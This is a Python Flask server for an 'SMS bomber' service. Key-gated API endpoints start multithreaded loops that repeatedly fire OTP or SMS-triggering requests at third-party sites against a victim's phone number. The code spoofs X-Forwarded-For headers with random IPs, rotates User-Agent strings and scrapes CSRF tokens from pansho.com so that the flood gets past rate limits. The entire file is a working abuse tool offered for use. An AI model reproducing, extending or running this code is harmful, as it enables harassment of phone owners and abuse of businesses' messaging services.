from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS
import json
import os
import time
import random
import threading
import requests as req_lib
from datetime import datetime, timedelta
from bs4 import BeautifulSoup
import re

app = Flask(__name__, static_folder='../admin', static_url_path='/admin')
CORS(app)

# ===== DATA FILES =====
REQUESTS_FILE = 'requests/requests.json'
STATS_FILE = 'requests/stats.json'
LOGS_FILE = 'requests/logs.json'
HISTORY_FILE = 'requests/history.json'
KEYS_GITHUB_URL = 'https://raw.githubusercontent.com/gauravbeniwal3003-prog/sms-bomber-api/main/requests/keys.txt'

# ===== LOAD DATA =====
def load_json(file, default):
    try:
        with open(file, 'r') as f:
            return json.load(f)
    except:
        return default

def save_json(file, data):
    try:
        os.makedirs(os.path.dirname(file), exist_ok=True)
        with open(file, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

requests_data = load_json(REQUESTS_FILE, [])
stats_data = load_json(STATS_FILE, {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0})
logs_data = load_json(LOGS_FILE, [])
history_data = load_json(HISTORY_FILE, [])

# ===== GLOBALS =====
bombing_active = False
bombing_threads = []
bombing_lock = threading.Lock()
active_keys = set()

# ===== LOAD KEYS FROM GITHUB =====
def load_keys_from_github():
    global active_keys
    try:
        resp = req_lib.get(KEYS_GITHUB_URL, timeout=10)
        if resp.status_code == 200:
            lines = resp.text.strip().split('\n')
            active_keys = {line.strip() for line in lines if line.strip() and not line.startswith('#')}
            print(f"✅ Loaded {len(active_keys)} keys from GitHub")
            return True
    except Exception as e:
        print(f"❌ Failed to load keys from GitHub: {e}")
    return False

# ===== KEY VALIDATION =====
def validate_key(key):
    if not active_keys:
        load_keys_from_github()
    return key in active_keys

# ===== PANSHO SESSION =====
def get_pansho_session():
    session = req_lib.Session()
    headers = {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
    }
    try:
        resp = session.get('https://pansho.com/', headers=headers, timeout=10)
        soup = BeautifulSoup(resp.text, 'html.parser')
        token = None
        token_input = soup.find('input', {'name': '_token'})
        if token_input:
            token = token_input.get('value')
        if not token:
            meta = soup.find('meta', {'name': 'csrf-token'})
            if meta:
                token = meta.get('content')
        if not token:
            token = 'DUMMY_TOKEN'
        return session, session.cookies.get_dict(), token
    except Exception as e:
        print(f"❌ Pansho session failed: {e}")
        return None, None, None

# ===== SEND REQUEST =====
def send_request(req, phone):
    try:
        if 'pansho' in req['name'].lower():
            session, cookies, token = get_pansho_session()
            if not session:
                return False
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
            ])
            body = req['body'].replace('{phone}', phone).replace('{token}', token)
            r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=5)
        else:
            session = req_lib.Session()
            headers = req['headers'].copy()
            headers['User-Agent'] = random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
            ])
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            if req['method'] == 'POST':
                if isinstance(req['body'], dict):
                    r = session.post(req['url'].replace('{phone}', phone), headers=headers, json=req['body'], timeout=5)
                else:
                    body = req['body'].replace('{phone}', phone)
                    r = session.post(req['url'].replace('{phone}', phone), headers=headers, data=body, timeout=5)
            else:
                r = session.get(req['url'].replace('{phone}', phone), headers=headers, timeout=5)
        
        with bombing_lock:
            stats_data['total_requests'] += 1
            if r.status_code in [200, 302, 201, 202]:
                stats_data['success'] += 1
                save_json(STATS_FILE, stats_data)
                return True
            elif r.status_code == 429:
                stats_data['rate_limited'] += 1
                save_json(STATS_FILE, stats_data)
                return False
            else:
                stats_data['failed'] += 1
                save_json(STATS_FILE, stats_data)
                return False
    except Exception as e:
        with bombing_lock:
            stats_data['total_requests'] += 1
            stats_data['failed'] += 1
            save_json(STATS_FILE, stats_data)
        return False

# ===== BOMBING WORKER — 3x HIT =====
def bombing_worker(phone, req, thread_id):
    global bombing_active
    phone_variants = req.get('phones', [phone])
    if not phone_variants:
        phone_variants = [phone]
    
    while bombing_active:
        target_phone = random.choice(phone_variants)
        
        # === 3 TIMES HIT ===
        for hit in range(3):
            if not bombing_active:
                break
            success = send_request(req, target_phone)
            
            with bombing_lock:
                log_entry = {
                    "time": datetime.now().isoformat(),
                    "request": req['name'],
                    "phone": target_phone,
                    "status": "success" if success else "failed",
                    "thread": thread_id,
                    "hit": hit + 1
                }
                logs_data.append(log_entry)
                save_json(LOGS_FILE, logs_data[-500:])
            
            time.sleep(0.01)  # Small delay between hits
        
        time.sleep(0.02)

# ===== ROUTES =====

@app.route('/')
@app.route('/api/health')
def health():
    return jsonify({"status": "ok", "message": "SMS Bomber API is live!"})

@app.route('/api/requests', methods=['GET'])
def get_requests():
    return jsonify(requests_data)

@app.route('/api/stats', methods=['GET'])
def get_stats():
    active_count = sum(1 for r in requests_data if r.get('active', True))
    return jsonify({
        "total_requests": len(requests_data),
        "active_requests": active_count,
        "usage": stats_data,
        "active_keys": len(active_keys)
    })

@app.route('/api/keys', methods=['GET'])
def get_keys():
    return jsonify({"keys": list(active_keys), "count": len(active_keys)})

@app.route('/api/keys/refresh', methods=['POST'])
def refresh_keys():
    if load_keys_from_github():
        return jsonify({"success": True, "keys": list(active_keys), "count": len(active_keys)})
    return jsonify({"error": "Failed to load keys"}), 500

@app.route('/api/logs', methods=['GET'])
def get_logs():
    limit = request.args.get('limit', 50, type=int)
    return jsonify(logs_data[-limit:])

# ===== ===== ===== =====
# ===== GET API — SIMPLE URL =====
# ===== ===== ===== =====
@app.route('/api', methods=['GET'])
def simple_api():
    key = request.args.get('key')
    phone = request.args.get('bomb')
    
    if not key:
        return jsonify({"error": "Missing 'key' parameter"}), 400
    
    # Validate key from GitHub
    if not validate_key(key):
        return jsonify({"error": "Invalid API key"}), 401
    
    if not phone:
        return jsonify({"error": "Missing 'bomb' parameter (phone number)"}), 400
    if not re.match(r'^\+?[0-9]{10,15}$', phone):
        return jsonify({"error": "Invalid phone number format"}), 400
    
    # Start bombing
    global bombing_active, bombing_threads, stats_data
    
    if bombing_active:
        return jsonify({"error": "Bombing already active"}), 400
    
    stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
    save_json(STATS_FILE, stats_data)
    
    bombing_active = True
    bombing_threads = []
    
    active_requests = [r for r in requests_data if r.get('active', True)]
    thread_id = 0
    for req in active_requests:
        for _ in range(2):  # 2 parallel threads per request
            t = threading.Thread(target=bombing_worker, args=(phone, req, thread_id))
            t.daemon = True
            t.start()
            bombing_threads.append(t)
            thread_id += 1
    
    return jsonify({
        "success": True,
        "message": f"Bombing started on {phone}",
        "phone": phone,
        "key": key,
        "active_requests": len(active_requests),
        "threads": len(bombing_threads),
        "hits_per_request": 3
    })

@app.route('/api/stop', methods=['GET'])
def simple_stop():
    key = request.args.get('key')
    if not key or not validate_key(key):
        return jsonify({"error": "Invalid API key"}), 401
    
    global bombing_active
    bombing_active = False
    return jsonify({
        "success": True,
        "message": "Bombing stopped",
        "stats": stats_data
    })

@app.route('/api/bomb/start', methods=['POST'])
def start_bombing_post():
    global bombing_active, bombing_threads, stats_data
    
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({"error": "Phone number required"}), 400
    
    api_key = data.get('api_key') or request.headers.get('X-API-Key')
    if api_key and not validate_key(api_key):
        return jsonify({"error": "Invalid API key"}), 401
    
    if bombing_active:
        return jsonify({"error": "Bombing already active"}), 400
    
    stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
    save_json(STATS_FILE, stats_data)
    
    bombing_active = True
    bombing_threads = []
    
    active_requests = [r for r in requests_data if r.get('active', True)]
    thread_id = 0
    for req in active_requests:
        for _ in range(2):
            t = threading.Thread(target=bombing_worker, args=(phone, req, thread_id))
            t.daemon = True
            t.start()
            bombing_threads.append(t)
            thread_id += 1
    
    return jsonify({
        "success": True,
        "message": f"Bombing started on {phone}",
        "phone": phone,
        "active_requests": len(active_requests),
        "threads": len(bombing_threads),
        "hits_per_request": 3
    })

@app.route('/api/bomb/stop', methods=['POST'])
def stop_bombing_post():
    global bombing_active
    bombing_active = False
    return jsonify({
        "success": True,
        "message": "Bombing stopped",
        "stats": stats_data
    })

@app.route('/api/bomb/status', methods=['GET'])
def bombing_status():
    return jsonify({
        "active": bombing_active,
        "stats": stats_data,
        "active_requests": sum(1 for r in requests_data if r.get('active', True)),
        "threads": len(bombing_threads)
    })

@app.route('/admin')
@app.route('/admin/')
def serve_admin():
    return send_from_directory('../admin', 'index.html')

# ===== LOAD KEYS ON STARTUP =====
load_keys_from_github()

app.debug = False
if __name__ == '__main__':
    app.run(debug=True, port=5000)
